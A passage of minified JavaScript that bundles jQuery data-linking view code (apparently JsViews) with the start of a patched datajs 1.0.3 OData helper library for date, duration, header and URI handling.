len=addedBindEls.length;while(len--){bindEls.push(addedBindEls[len]);}}
return!vwInfos||vwInfos.elCnt;}
function getViewInfos(vwInfos){var level,parentTag;if(len=vwInfos&&vwInfos.length){for(j=0;j<len;j++){vwInfo=vwInfos[j];if(get.id){get.id=get.id!==vwInfo.id&&get.id;}else{parentTag=tag=bindingStore[vwInfo.id].linkCtx.tag;if(!tag.flow){if(!deep){level=1;while(parentTag=parentTag.parent){level++;}
tagDepth=tagDepth||level;}
if((deep||level===tagDepth)&&(!tagName||tag.tagName===tagName)){tags.push(tag);}}}}}}
var linkCtx,tag,i,l,j,len,elems,elem,view,vwInfos,vwInfo,linkInfo,prevNodes,token,prevView,nextView,node,tags,deep,tagName,tagDepth,get,depth,fragment,copiedNode,firstTag,parentTag,wrapper,div,tokens,elCnt,prevElCnt,htmlTag,ids,prevIds,found,self=this,thisId=self._.id+"_",defer="",bindEls=[],tagStack=[],deferStack=[],onAfterCreate=self.hlp(onAfterCreateStr),processInfos=processViewInfos;if(refresh){if(refresh.tmpl){prevView="/"+refresh._.id+"_";}else{get=refresh.get;if(refresh.tag){thisId=refresh.tag+"^";refresh=true;}}
refresh=refresh===true;}
if(get){processInfos=getViewInfos;tags=get.tags;deep=get.deep;tagName=get.name;}
parentNode=parentNode?(""+parentNode===parentNode?$(parentNode)[0]:parentNode.jquery?parentNode[0]:parentNode):(self.parentElem||document.body);parentTag=parentNode.tagName.toLowerCase();elCnt=!!elContent[parentTag];prevNode=prevNode&&markPrevOrNextNode(prevNode,elCnt);nextNode=nextNode&&markPrevOrNextNode(nextNode,elCnt)||null;if(html!==undefined){div=document.createElement("div");wrapper=div;prevIds=ids="";htmlTag=parentNode.namespaceURI==="http://www.w3.org/2000/svg"?"svg":(firstTag=rFirstElem.exec(html))&&firstTag[1]||"";if(elCnt){node=nextNode;while(node&&!(nextView=viewInfos(node))){node=node.nextSibling;}
if(tokens=nextView?nextView.tokens:parentNode._dfr){token=prevView||"";if(refresh||!prevView){token+="#"+thisId;}
j=tokens.indexOf(token);if(j+1){j+=token.length;prevIds=ids=tokens.slice(0,j);tokens=tokens.slice(j);if(nextView){node.setAttribute(jsvAttrStr,tokens);}else{parentNode._dfr=tokens;}}}}
html=(""+html).replace(rConvertMarkers,convertMarkers);safeFragment.appendChild(div);htmlTag=wrapMap[htmlTag]||wrapMap.div;depth=htmlTag[0];wrapper.innerHTML=htmlTag[1]+html+htmlTag[2];while(depth--){wrapper=wrapper.lastChild;}
safeFragment.removeChild(div);fragment=document.createDocumentFragment();while(copiedNode=wrapper.firstChild){fragment.appendChild(copiedNode);}
parentNode.insertBefore(fragment,nextNode);}
elems=qsa?parentNode.querySelectorAll(linkViewsSel):$(linkViewsSel,parentNode).get();l=elems.length;if(prevNode){prevNodes=qsa?prevNode.querySelectorAll(linkViewsSel):$(linkViewsSel,prevNode).get();prevNode=prevNodes.length?prevNodes[prevNodes.length-1]:prevNode;}
tagDepth=0;for(i=0;i<l;i++){elem=elems[i];if(prevNode&&!found){found=(elem===prevNode);}else if(nextNode&&elem===nextNode){break;}else if(elem.parentNode&&processInfos(viewInfos(elem,undefined,tags&&rOpenTagMarkers))&&elem.getAttribute($viewsLinkAttr)){bindEls.push([elem]);}}
unmarkPrevOrNextNode(prevNode,elCnt);unmarkPrevOrNextNode(nextNode,elCnt);if(get){return;}
if(elCnt&&defer+ids){elem=nextNode;if(defer){if(nextNode){processViewInfos(viewInfos(defer+"+",true),nextNode);}else{processViewInfos(viewInfos(defer,true),parentNode);}}
processViewInfos(viewInfos(ids,true),parentNode);if(nextNode){tokens=nextNode.getAttribute(jsvAttrStr);if(l=tokens.indexOf(prevIds)+1){tokens=tokens.slice(l+prevIds.length-1);}
nextNode.setAttribute(jsvAttrStr,ids+tokens);}}
l=bindEls.length;for(i=0;i<l;i++){elem=bindEls[i];linkInfo=elem[1];elem=elem[0];if(linkInfo){tag=bindingStore[linkInfo.id];tag=tag.linkCtx?tag.linkCtx.tag:tag;if(linkInfo.open){if(elem){tag.parentElem=elem.parentNode;tag._prv=elem;}
tag._elCnt=linkInfo.elCnt;if(tag&&tag.onBeforeLink){tag.onBeforeLink();}
tag._.linking=true;}else{tag._nxt=elem;if(tag._.linking){view=tag.tagCtx.view;tag.contents=getContents;tag.nodes=getNodes;tag.childTags=getChildTags;delete tag._.linking;if(tag&&tag.onAfterLink){tag.onAfterLink();}
if(!tag._.bound){tag._.bound=true;addDataBinding(undefined,tag._prv,view,view.data||outerData,linkInfo.id);}}}}else{view=$view(elem);addDataBinding(elem.getAttribute($viewsLinkAttr),elem,view,view.data||outerData);}}}
function addDataBinding(linkMarkup,node,currentView,data,boundTagId){var tmpl,tokens,attr,convertBack,params,trimLen,tagExpr,linkFn,linkCtx,tag,rTagIndex;if(boundTagId){tag=bindingStore[boundTagId];tag=tag.linkCtx?tag.linkCtx.tag:tag;linkCtx=tag.linkCtx||{data:data,elem:tag._elCnt?tag.parentElem:node,view:currentView,attr:"html",fn:tag._.bnd,tag:tag,_bndId:boundTagId};bindDataLinkTarget(linkCtx,linkCtx.fn);}else if(linkMarkup&&node){tmpl=currentView.tmpl;linkMarkup=normalizeLinkTag(linkMarkup,node);rTag.lastIndex=0;while(tokens=rTag.exec(linkMarkup)){rTagIndex=rTag.lastIndex;attr=boundTagId?"html":tokens[1];tagExpr=tokens[3];params=tokens[10];convertBack=undefined;linkCtx={data:data,elem:tag&&tag._elCnt?tag.parentElem:node,view:currentView,attr:attr,_initVal:!tokens[2]};if(tokens[6]){if(!attr&&(convertBack=/:([\w$]*)$/.exec(params))){convertBack=convertBack[1];if(convertBack!==undefined){trimLen=-convertBack.length-1;tagExpr=tagExpr.slice(0,trimLen-1)+delimCloseChar0;params=params.slice(0,trimLen);}}
if(convertBack===null){convertBack=undefined;}
linkCtx.cvt=tokens[5]||"";}
linkCtx.expr=attr+tagExpr;linkFn=tmpl.links[tagExpr];if(!linkFn){tmpl.links[tagExpr]=linkFn=$viewsSub.tmplFn(delimOpenChar0+tagExpr+delimCloseChar1,tmpl,true,convertBack);$viewsSub.parse(params,linkFn.paths=[],tmpl);}
linkCtx.fn=linkFn
if(!attr&&convertBack!==undefined){linkCtx._cvtBk=convertBack;}
bindDataLinkTarget(linkCtx,linkFn);rTag.lastIndex=rTagIndex;}}}
function bindDataLinkTarget(linkCtx,linkFn){function handler(ev,eventArgs){propertyChangeHandler.call(linkCtx,ev,eventArgs,linkFn);}
linkCtx._ctxCb=getContextCb(linkCtx.view);linkCtx._hdlr=handler;if(linkCtx.tag&&linkCtx.tag.onArrayChange){handler.array=function(ev,eventArgs){linkCtx.tag.onArrayChange(ev,eventArgs);}}
handler(true);}
function removeSubStr(str,substr){var k;return str?(k=str.indexOf(substr),(k+1?str.slice(0,k)+str.slice(k+substr.length):str)):"";}
function markerNodeInfo(node){return node&&(""+node===node?node:node.tagName==="SCRIPT"?node.type.slice(3):node.nodeType===1&&node.getAttribute(jsvAttrStr)||"");}
function viewInfos(node,isVal,rBinding){function getInfos(all,open,close,id,ch,elPath){infos.push({elCnt:elCnt,id:id,ch:ch,open:open,close:close,path:elPath,token:all});}
var elCnt,tokens,infos=[];if(tokens=isVal?node:markerNodeInfo(node)){infos.elCnt=!node.type;elCnt=tokens.charAt(0)==="@"||!node.type;infos.tokens=tokens;tokens.replace(rBinding||rMarkerTokens,getInfos);return infos;}}
function unmarkPrevOrNextNode(node,elCnt){if(node){if(node.type==="jsv"){node.parentNode.removeChild(node);}else if(elCnt&&node.getAttribute($viewsLinkAttr)===""){node.removeAttribute($viewsLinkAttr);}}}
function markPrevOrNextNode(node,elCnt){var marker=node;while(elCnt&&marker&&marker.nodeType!==1){marker=marker.previousSibling;}
if(marker){if(marker.nodeType!==1){marker=document.createElement("SCRIPT");marker.type="jsv";node.parentNode.insertBefore(marker,node);}else if(!markerNodeInfo(marker)&&!marker.getAttribute($viewsLinkAttr)){marker.setAttribute($viewsLinkAttr,"");}}
return marker;}
function normalizeLinkTag(linkMarkup,node){linkMarkup=$.trim(linkMarkup);return linkMarkup.slice(-1)!==delimCloseChar0?linkMarkup=delimOpenChar1+":"+linkMarkup+(defaultAttr(node)?":":"")+delimCloseChar0:linkMarkup;}
function getContents(select,deep){var filtered,nodes=$(this.nodes());if(nodes[0]){filtered=select?nodes.filter(select):nodes;nodes=deep&&select?filtered.add(nodes.find(select)):filtered;}
return nodes;}
function getNodes(withMarkers,prevNode,nextNode){var node,self=this,elCnt=self._elCnt,prevIsFirstNode=!prevNode&&elCnt,nodes=[];prevNode=prevNode||self._prv;nextNode=nextNode||self._nxt;node=prevIsFirstNode?(prevNode===self._nxt?self.parentElem.lastSibling:prevNode):(self._.inline===false?prevNode||self.linkCtx.elem.firstChild:prevNode&&prevNode.nextSibling);while(node&&(!nextNode||node!==nextNode)){if(withMarkers||elCnt||!markerNodeInfo(node)){nodes.push(node);}
node=node.nextSibling;}
return nodes;}
function getChildTags(deep,tagName){if(deep!==!!deep){tagName=deep;deep=undefined;}
var self=this,view=self.link?self:self.tagCtx.view,prevNode=self._prv,elCnt=self._elCnt,tags=[];if(prevNode){view.link(undefined,self.parentElem,elCnt?prevNode.previousSibling:prevNode,self._nxt,undefined,{get:{tags:tags,deep:deep,name:tagName,id:elCnt&&self._tgId}});}
return tags;}
function refreshTag(sourceValue){var skipBinding,nodesToRemove,tag=this,target=tag.parentElem,view=tag.tagCtx.view,prevNode=tag._prv,nextNode=tag._nxt,elCnt=tag._elCnt,inline=tag._.inline;if(sourceValue===undefined){sourceValue=tag._.bnd.call(view.tmpl,view.data,view,$views);if(inline){sourceValue=$views._tag(tag,view,view.tmpl,sourceValue);}}
if(!tag.flow&&!tag.render&&!tag.template){}else if(inline){nodesToRemove=tag.nodes(true);if(elCnt){if(prevNode&&prevNode!==nextNode){transferViewTokens(prevNode,nextNode,target,tag._tgId,"^",true);}
prevNode=prevNode?prevNode.previousSibling:nextNode?nextNode.previousSibling:target.lastChild;}
$(nodesToRemove).remove();}else{if(!tag.flow&&tag.tagCtx.props.inline){view._.tag=tag;sourceValue=addBindingMarkers(sourceValue,view,true);view._.tag=undefined;skipBinding=tag._.inline=true;}
$(target).empty();}
if(!skipBinding&&tag.onBeforeLink){tag.onBeforeLink();}
view.link(view.data,target,prevNode,nextNode,sourceValue,tag&&{tag:tag._tgId});if(!skipBinding&&tag.onAfterLink){tag.onAfterLink();}
return tag;}
function clean(elems){var i,j,l,l2,elem,vwInfos,vwItem,bindings,elemArray=[];for(i=0;elem=elems[i];i++){elemArray.push(elem);}
for(i=0;elem=elemArray[i];i++){if(elem.parentNode){if(bindings=elem._jsvBnd){bindings=bindings.slice(1).split("&");elem._jsvBnd="";l=bindings.length;while(l--){removeViewBinding(bindings[l],true);}}
if(vwInfos=viewInfos(markerNodeInfo(elem)+(elem._dfr||""),true,rOpenMarkers)){for(j=0,l2=vwInfos.length;j<l2;j++){vwItem=vwInfos[j];if(vwItem.ch==="_"){if((vwItem=viewStore[vwItem.id])&&vwItem.data!==undefined){vwItem.parent.removeViews(vwItem._.key,undefined,true);}}else{removeViewBinding(vwItem.id,true);}}}}}}
function removeViewBinding(bindId,keepNodes){var objId,linkCtx,tag,object,obsId,binding=bindingStore[bindId];if(binding){for(objId in binding.bnd){object=binding.bnd[objId];obsId=".obs"+binding.cbId;if($.isArray(object)){$([object]).off(arrayChangeStr+obsId).off(propertyChangeStr+obsId);}else{$(object).off(propertyChangeStr+obsId);}
delete binding.bnd[objId];}
linkCtx=binding.linkCtx;if(tag=linkCtx.tag){if(tag.onDispose){tag.onDispose();}
if(!keepNodes&&!tag._elCnt){tag._prv.parentNode.removeChild(tag._prv);tag._nxt.parentNode.removeChild(tag._nxt);}}
delete linkCtx.view._.bnds[bindId];delete bindingStore[bindId]
delete $viewsSub._cbBnds[binding.cbId];}}
function $unlink(tmplOrLinkTag,to){if(!arguments.length){if(activeBody){$(activeBody).off(elementChangeStr,elemChangeHandler);activeBody=undefined;}
tmplOrLinkTag=true;topView.removeViews();clean(document.body.getElementsByTagName("*"));}else if(to){to=to.jquery?to:$(to);if(tmplOrLinkTag===true){$.each(to,function(){var innerView;while((innerView=$view(this,true))&&innerView.parent){innerView.parent.removeViews(innerView._.key,undefined,true);}
clean(this.getElementsByTagName("*"));});}else if(tmplOrLinkTag===undefined){clean(to);}}
return to;}
function tmplUnlink(to,from){return $unlink(this,to,from);}
function getContextCb(view){view=view||$.view();return function(path,object){var tokens,tag,items=[object];if(view&&path){if(path._jsvOb){return path._jsvOb.call(view.tmpl,object,view,$views);}else if(path.charAt(0)==="~"){if(path.slice(0,4)==="~tag"){tag=view.ctx;if(path.charAt(4)==="."){tokens=path.slice(5).split(".");tag=tag.tag;}else if(path.slice(4,6)==="s."){tokens=path.slice(6).split(".");tag=tag.tags[tokens.shift()];}
if(tokens){return tag?[tag,tokens.join("."),object]:[];}}
path=path.slice(1).split(".");if(object=view.hlp(path.shift())){if(path.length){items.unshift(path.join("."));}
items.unshift(object);}
return object?items:[];}
if(path.charAt(0)==="#"){return path==="#data"?[]:[view,path.replace(rViewPath,""),object];}}};}
function inputAttrib(elem){return elem.type==="checkbox"?elem.checked:elem.value;}
$viewsSub.onStoreItem=function(store,name,item){if(item&&store===$templates){item.link=tmplLink;item.unlink=tmplUnlink;if(name){$.link[name]=function(){return tmplLink.apply(item,arguments);};$.unlink[name]=function(){return tmplUnlink.apply(item,arguments);};}}};($viewsSettings.delimiters=function(){var delimChars=oldJsvDelimiters.apply($views,arguments);delimOpenChar0=delimChars[0];delimOpenChar1=delimChars[1];delimCloseChar0=delimChars[2];delimCloseChar1=delimChars[3];linkChar=delimChars[4];rTag=new RegExp("(?:^|\\s*)([\\w-]*)(\\"+linkChar+")?(\\"+delimOpenChar1+$viewsSub.rTag+"\\"+delimCloseChar0+")","g");return this;})();$viewsSub.viewInfos=viewInfos;function transferViewTokens(prevNode,nextNode,parentElem,id,viewOrTagChar,refresh){var i,l,vwInfos,vwInfo,viewOrTag,viewId,tokens,precedingLength=0,emptyView=prevNode===nextNode;if(prevNode){vwInfos=viewInfos(prevNode)||[];for(i=0,l=vwInfos.length;i<l;i++){vwInfo=vwInfos[i];viewId=vwInfo.id;if(viewId===id&&vwInfo.ch===viewOrTagChar){if(refresh){l=0;}else{break;}}
if(!emptyView){viewOrTag=vwInfo.ch==="_"?viewStore[viewId]:bindingStore[viewId].linkCtx.tag;if(vwInfo.open){viewOrTag._prv=nextNode;}else if(vwInfo.close){viewOrTag._nxt=nextNode;}}
precedingLength+=viewId.length+2;}
if(precedingLength){prevNode.setAttribute(jsvAttrStr,prevNode.getAttribute(jsvAttrStr).slice(precedingLength));}
tokens=nextNode?nextNode.getAttribute(jsvAttrStr):parentElem._dfr;if(l=tokens.indexOf("/"+id+viewOrTagChar)+1){tokens=vwInfos.tokens.slice(0,precedingLength)+tokens.slice(l+(refresh?-1:id.length+1));}
if(tokens){if(nextNode){nextNode.setAttribute(jsvAttrStr,tokens);}else{parentElem._dfr=tokens;}}}else{parentElem._dfr=removeSubStr(parentElem._dfr,"#"+id+viewOrTagChar);if(!refresh&&!nextNode){parentElem._dfr=removeSubStr(parentElem._dfr,"/"+id+viewOrTagChar);}}}
LinkedView={addViews:function(index,dataItems,tmpl){var i,viewsCount,self=this,itemsCount=dataItems.length,views=self.views;if(!self._.useKey&&itemsCount&&(tmpl=self.tmpl)){viewsCount=views.length+itemsCount;if(renderAndLink(self,index,tmpl,views,dataItems,self.ctx)!==false){for(i=index+itemsCount;i<viewsCount;i++){$observable(views[i]).setProperty("index",i);}}}
return self;},removeViews:function(index,itemsCount,keepNodes){function removeView(index){var id,bindId,parentElem,prevNode,nextNode,nodesToRemove,viewToRemove=views[index];if(viewToRemove&&viewToRemove.link){id=viewToRemove._.id;if(!keepNodes){nodesToRemove=viewToRemove.nodes();}
viewToRemove.removeViews(undefined,undefined,true);viewToRemove.data=undefined;prevNode=viewToRemove._prv;nextNode=viewToRemove._nxt;parentElem=viewToRemove.parentElem;if(!keepNodes){if(viewToRemove._elCnt){transferViewTokens(prevNode,nextNode,parentElem,id,"_");}
$(nodesToRemove).remove();}
if(!viewToRemove._elCnt){parentElem.removeChild(prevNode);try{parentElem.removeChild(nextNode);}catch(e){}}
setArrayChangeLink(viewToRemove);for(bindId in viewToRemove._.bnds){removeViewBinding(bindId,keepNodes);}
delete viewStore[id];}}
var current,view,viewsCount,self=this,isArray=!self._.useKey,views=self.views;if(isArray){viewsCount=views.length;}
if(index===undefined){if(isArray){current=viewsCount;while(current--){removeView(current);}
self.views=[];}else{for(view in views){removeView(view);}
self.views={};}}else{if(itemsCount===undefined){if(isArray){itemsCount=1;}else{removeView(index);delete views[index];}}
if(isArray&&itemsCount){current=index+itemsCount;while(current-->index){removeView(current);}
views.splice(index,itemsCount);if(viewsCount=views.length){while(index<viewsCount){$observable(views[index]).setProperty("index",index++);}}}}
return this;},refresh:function(context){var self=this,parent=self.parent;if(parent){renderAndLink(self,self.index,self.tmpl,parent.views,self.data,context,true);setArrayChangeLink(self);}
return self;},nodes:getNodes,contents:getContents,childTags:getChildTags,link:viewLink};$viewsSettings.merge={input:{from:{fromAttr:inputAttrib},to:{toAttr:"value"}},textarea:valueBinding,select:valueBinding,optgroup:{from:{fromAttr:"label"},to:{toAttr:"label"}}};if($viewsSettings.debugMode){validate=!$viewsSettings.noValidate;global._jsv={views:viewStore,bindings:bindingStore};}
$extend($,{view:$view=function(node,inner,type){if(inner!==!!inner){type=inner;inner=undefined;}
var view,vwInfos,i,j,k,l,elem,elems,level=0,body=document.body;if(node&&node!==body&&topView._.useKey>1){node=""+node===node?$(node)[0]:node.jquery?node[0]:node;if(node){if(inner){elems=qsa?node.querySelectorAll(bindElsSel):$(bindElsSel,node).get();l=elems.length;for(i=0;i<l;i++){elem=elems[i];vwInfos=viewInfos(elem,undefined,rOpenViewMarkers);for(j=0,k=vwInfos.length;j<k;j++){view=vwInfos[j];if(view=viewStore[view.id]){view=view&&type?view.get(true,type):view;if(view){return view;}}}}}else{while(node){if(vwInfos=viewInfos(node,undefined,rViewMarkers)){l=vwInfos.length;while(l--){view=vwInfos[l];if(view.open){if(level<1){view=viewStore[view.id];return view&&type?view.get(type):view||topView;}
level--;}else{level++;}}}
node=node.previousSibling||node.parentNode;}}}}
return inner?undefined:topView;},link:$link,unlink:$unlink,cleanData:function(elems){if(elems.length){clean(elems);oldCleanData.call($,elems);}}});$extend($.fn,{link:function(expr,from,context,parentView,prevNode,nextNode){return $link(expr,this,from,context,parentView,prevNode,nextNode);},unlink:function(expr,from){return $unlink(expr,this,from);},view:function(type){return $view(this[0],type);}});$extend(topView,{tmpl:{links:{},tags:{}}});$extend(topView,LinkedView);topView._.onRender=addBindingMarkers;})(this,this.jQuery);
// js/jaydata/datajs-1.0.3-patched.js

(function(window,undefined){if(!window.datajs){window.datajs={};}
if(!window.OData){window.OData={};}
var datajs=window.datajs;var odata=window.OData;var PAYLOADTYPE_BATCH="b";var PAYLOADTYPE_COMPLEXTYPE="c";var PAYLOADTYPE_ENTRY="entry";var PAYLOADTYPE_FEEDORLINKS="f";var PAYLOADTYPE_PRIMITIVETYPE="p";var PAYLOADTYPE_SVCDOC="s";var PAYLOADTYPE_UNKNOWN="u";var PAYLOADTYPE_NONE="n";var PROPERTYKIND_COMPLEX="c";var PROPERTYKIND_DEFERRED="d";var PROPERTYKIND_INLINE="i";var PROPERTYKIND_PRIMITIVE="p";var PROPERTYKIND_NONE="n";var assigned=function(value){return value!==null&&value!==undefined;};var contains=function(arr,item){var i,len;for(i=0,len=arr.length;i<len;i++){if(arr[i]===item){return true;}}
return false;};var defined=function(a,b){return(a!==undefined)?a:b;};var delay=function(callback){if(arguments.length===1){window.setTimeout(callback,0);return;}
var args=Array.prototype.slice.call(arguments,1);window.setTimeout(function(){callback.apply(this,args);},0);};var forEachSchema=function(metadata,callback){if(!metadata){return null;}
if(isArray(metadata)){var i,len,result;for(i=0,len=metadata.length;i<len;i++){result=forEachSchema(metadata[i],callback);if(result){return result;}}
return null;}else{if(metadata.dataServices){return forEachSchema(metadata.dataServices.schema,callback);}
return callback(metadata);}};var isDateTimeOffset=function(value){return(value.__edmType==="Edm.DateTimeOffset"||(!value.__edmType&&value.__offset));};var formatMilliseconds=function(ms,ns){if(ms===0){ms="";}else{ms="."+formatNumberWidth(ms.toString(),3);}
if(ns>0){if(ms===""){ms=".000";}
ms+=formatNumberWidth(ns.toString(),4);}
return ms;};var formatDateTimeOffset=function(value){if(typeof value==="string"){return value;}
var hasOffset=isDateTimeOffset(value);var offset=getCanonicalTimezone(value.__offset);if(hasOffset&&offset!=="Z"){value=new Date(value.valueOf());var timezone=parseTimezone(offset);var hours=value.getUTCHours()+(timezone.d*timezone.h);var minutes=value.getMinutes()+(timezone.d*timezone.m);value.setUTCHours(hours,minutes);}else if(!hasOffset){offset="";}
var year=value.getUTCFullYear();var month=value.getUTCMonth()+1;var sign="";if(year<=0){year=-(year-1);sign="-";}
var ms=formatMilliseconds(value.getUTCMilliseconds(),value.__ns);return sign+
formatNumberWidth(year,4)+"-"+
formatNumberWidth(month,2)+"-"+
formatNumberWidth(value.getUTCDate(),2)+"T"+
formatNumberWidth(value.getUTCHours(),2)+":"+
formatNumberWidth(value.getUTCMinutes(),2)+":"+
formatNumberWidth(value.getUTCSeconds(),2)+
ms+offset;};var formatDuration=function(value){var ms=value.ms;var sign="";if(ms<0){sign="-";ms=-ms;}
var days=Math.floor(ms/86400000);ms-=86400000*days;var hours=Math.floor(ms/3600000);ms-=3600000*hours;var minutes=Math.floor(ms/60000);ms-=60000*minutes;var seconds=Math.floor(ms/1000);ms-=seconds*1000;return sign+"P"+
formatNumberWidth(days,2)+"DT"+
formatNumberWidth(hours,2)+"H"+
formatNumberWidth(minutes,2)+"M"+
formatNumberWidth(seconds,2)+
formatMilliseconds(ms,value.ns)+"S";};var formatNumberWidth=function(value,width,append){var result=value.toString(10);while(result.length<width){if(append){result+="0";}else{result="0"+result;}}
return result;};var getCanonicalTimezone=function(timezone){return(!timezone||timezone==="Z"||timezone==="+00:00"||timezone==="-00:00")?"Z":timezone;};var invokeRequest=function(request,success,error,handler,httpClient,context){return httpClient.request(request,function(response){try{if(response.headers){normalizeHeaders(response.headers);}
if(response.data===undefined){handler.read(response,context);}}catch(err){if(err.request===undefined){err.request=request;}
if(err.response===undefined){err.response=response;}
error(err);return;}
success(response.data,response);},error);};var isArray=function(value){return Object.prototype.toString.call(value)==="[object Array]";};var isDate=function(value){return Object.prototype.toString.call(value)==="[object Date]";};var lookupProperty=function(properties,name){if(properties){var i,len;for(i=0,len=properties.length;i<len;i++){if(properties[i].name===name){return properties[i];}}}
return null;};var lookupTypeInMetadata=function(name,metadata,kind){return(name)?forEachSchema(metadata,function(schema){return lookupTypeInSchema(name,schema,kind);}):null;};var lookupComplexType=function(name,metadata){return lookupTypeInMetadata(name,metadata,"complexType");};var lookupEntityType=function(name,metadata){return lookupTypeInMetadata(name,metadata,"entityType");};var removeNamespace=function(ns,fullName){if(fullName.indexOf(ns)===0&&fullName.charAt(ns.length)==="."){return fullName.substr(ns.length+1);}
return null;};var lookupTypeInSchema=function(name,metadata,kind){if(metadata){var nameOnly=removeNamespace(metadata["namespace"],name);var types=metadata[kind];if(nameOnly&&types){var i,len;for(i=0,len=types.length;i<len;i++){if(types[i].name===nameOnly){return types[i];}}}}
return null;};var normalHeaders={"accept":"Accept","content-type":"Content-Type","dataserviceversion":"DataServiceVersion","maxdataserviceversion":"MaxDataServiceVersion"};var normalizeHeaders=function(headers){for(var name in headers){var lowerName=name.toLowerCase();var normalName=normalHeaders[lowerName];if(normalName&&name!==normalName){var val=headers[name];delete headers[name];headers[normalName]=val;}}};var undefinedDefault=function(value,defaultValue){return(value!==undefined)?value:defaultValue;};var parseInt10=function(value){return parseInt(value,10);};var parseTimeRE=/^([+-])?P(?:(\d+)Y)?(?:(\d+)M)?(?:(\d+)D)?(?:T(?:(\d+)H)?(?:(\d+)M)?(?:(\d+)(?:\.(\d+))?S)?)?/;var parseDuration=function(duration){var parts=parseTimeRE.exec(duration);if(parts===null){throw{message:"Invalid duration value."};}
var years=parts[2]||"0";var months=parts[3]||"0";var days=parseInt10(parts[4]||0);var hours=parseInt10(parts[5]||0);var minutes=parseInt10(parts[6]||0);var seconds=parseFloat(parts[7]||0);if(years!=="0"||months!=="0"){throw{message:"Unsupported duration value."};}
var ms=parts[8];var ns=0;if(!ms){ms=0;}else{if(ms.length>7){throw{message:"Cannot parse duration value to given precision."};}
ns=formatNumberWidth(ms.substring(3),4,true);ms=formatNumberWidth(ms.substring(0,3),3,true);ms=parseInt10(ms);ns=parseInt10(ns);}
ms+=seconds*1000+minutes*60000+hours*3600000+days*86400000;if(parts[1]==="-"){ms=-ms;}
var result={ms:ms,__edmType:"Edm.Time"};if(ns){result.ns=ns;}
return result;};var parseTimezone=function(timezone){var direction=timezone.substring(0,1);direction=(direction==="+")?1:-1;var offsetHours=parseInt10(timezone.substring(1));var offsetMinutes=parseInt10(timezone.substring(timezone.indexOf(":")+1));return{d:direction,h:offsetHours,m:offsetMinutes};};var payloadTypeOf=function(data){switch(typeof(data)){case"object":if(!data){return PAYLOADTYPE_NONE;}
if(isArray(data)||isArray(data.results)){return PAYLOADTYPE_FEEDORLINKS;}
if(data.__metadata&&data.__metadata.uri!==undefined){return PAYLOADTYPE_ENTRY;}
if(isArray(data.EntitySets)){return PAYLOADTYPE_SVCDOC;}
if(isArray(data.__batchRequests)){return PAYLOADTYPE_BATCH;}
if(isDate(data)){return PAYLOADTYPE_PRIMITIVETYPE;}
return PAYLOADTYPE_COMPLEXTYPE;case"string":case"number":case"boolean":return PAYLOADTYPE_PRIMITIVETYPE;}
return PAYLOADTYPE_UNKNOWN;};var prepareRequest=function(request,handler,context){if(!request.method){request.method="GET";}
if(!request.headers){request.headers={};}else{normalizeHeaders(request.headers);}
if(request.headers.Accept===undefined){request.headers.Accept=handler.accept;}
if(assigned(request.data)&&request.body===undefined){handler.write(request,context);}
if(!assigned(request.headers.MaxDataServiceVersion)){request.headers.MaxDataServiceVersion=handler.maxDataServiceVersion||"1.0";}};var propertyKindOf=function(value){switch(payloadTypeOf(value)){case PAYLOADTYPE_COMPLEXTYPE:if(value.__deferred&&value.__deferred.uri){return PROPERTYKIND_DEFERRED;}
return PROPERTYKIND_COMPLEX;case PAYLOADTYPE_FEEDORLINKS:case PAYLOADTYPE_ENTRY:return PROPERTYKIND_INLINE;case PAYLOADTYPE_PRIMITIVETYPE:return PROPERTYKIND_PRIMITIVE;}
return PROPERTYKIND_NONE;};var throwErrorCallback=function(error){throw error;};var trimString=function(str){if(str.trim){return str.trim();}
return str.replace(/^\s+|\s+$/g,'');};var uriRegEx=/^([^:\/?#]+:)?(\/\/[^\/?#]*)?([^?#:]+)?(\?[^#]*)?(#.*)?/;var uriPartNames=["scheme","authority","path","query","fragment"];var getURIInfo=function(uri){var result={isAbsolute:false};if(uri){var matches=uriRegEx.exec(uri);if(matches){var i,len;for(i=0,len=uriPartNames.length;i<len;i++){if(matches[i+1]){result[uriPartNames[i]]=matches[i+1];}}}
if(result.scheme){result.isAbsolute=true;}}
return result;};var getURIFromInfo=function(uriInfo){return"".concat(uriInfo.scheme||"",uriInfo.authority||"",uriInfo.path||"",uriInfo.query||"",uriInfo.fragment||"");};var uriAuthorityRegEx=/^\/{0,2}(?:([^@]*)@)?([^:]+)(?::{1}(\d+))?/;var pctEncodingRegEx=/%[0-9A-F]{2}/ig;var normalizeURICase=function(uri){var uriInfo=getURIInfo(uri);var scheme=uriInfo.scheme;var authority=uriInfo.authority;if(scheme){uriInfo.scheme=scheme.toLowerCase();if(authority){var matches=uriAuthorityRegEx.exec(authority);if(matches){uriInfo.authority="//"+
(matches[1]?matches[1]+"@":"")+
(matches[2].toLowerCase())+
(matches[3]?":"+matches[3]:"");}}}
uri=getURIFromInfo(uriInfo);return uri.replace(pctEncodingRegEx,function(str){return str.toLowerCase();});};var normalizeURI=function(uri,base){if(!base){return uri;}
var uriInfo=getURIInfo(uri);if(uriInfo.isAbsolute){return uri;}
var baseInfo=getURIInfo(base);var normInfo={};var path;if(uriInfo.authority){normInfo.authority=uriInfo.authority;path=uriInfo.path;normInfo.query=uriInfo.query;}else{if(!uriInfo.path){path=baseInfo.path;normInfo.query=uriInfo.query||baseInfo.query;}else{if(uriInfo.path.charAt(0)==='/'){path=uriInfo.path;}else{path=mergeUriPathWithBase(uriInfo.path,baseInfo.path);}
normInfo.query=uriInfo.query;}
normInfo.authority=baseInfo.authority;}
normInfo.path=removeDotsFromPath(path);normInfo.scheme=baseInfo.scheme;normInfo.fragment=uriInfo.fragment;return getURIFromInfo(normInfo);};var mergeUriPathWithBase=function(uriPath,basePath){var path="/";var end;if(basePath){end=basePath.lastIndexOf("/");path=basePath.substring(0,end);if(path.charAt(path.length-1)!=="/"){path=path+"/";}}
return path+uriPath;};var removeDotsFromPath=function(path){var result="";var segment="";var end;while(path){if(path.indexOf("..")===0||path.indexOf(".")===0){path=path.replace(/^\.\.?\/?/g,"");}else if(path.indexOf("/..")===0){path=path.replace(/^\/\..\/?/g,"/");end=result.lastIndexOf("/");if(end===-1){result="";}else{result=result.substring(0,end);}}else if(path.indexOf("/.")===0){path=path.replace(/^\/\.\/?/g,"/");}else{segment=path;end=path.indexOf("/",1);if(end!==-1){segment=path.substring(0,end);}
result=result+segment;path=path.replace(segment,"");}}
return result;};var ticks=0;var canUseJSONP=function(request){if(request.method&&request.method!=="GET"){return false;}
